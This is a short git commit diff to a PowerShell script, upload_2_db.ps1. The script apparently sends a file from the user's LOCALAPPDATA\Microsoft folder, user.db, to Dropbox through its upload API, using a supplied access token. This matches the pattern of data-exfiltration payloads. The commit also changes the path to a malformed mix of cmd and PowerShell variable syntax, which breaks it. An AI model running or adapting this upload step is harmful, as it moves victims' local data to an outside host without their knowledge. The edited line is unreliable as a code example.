97829cb6605b1454fcc2c12aaedb02820a0eca39
CodingRabbi <50125131+CodingRabbi@users.noreply.github.com>
2023-04-02 12:27:04 -0400

    Update upload_2_db.ps1

--- upload_2_db.ps1
+++ upload_2_db.ps1
@@ -20,5 +20,5 @@ $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-$FileName = "$env:LOCALAPPDATA\Microsoft\user.db"
+$FileName = "$env:%LOCALAPPDATA%\Microsoft\user.db"
 if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $FileName}
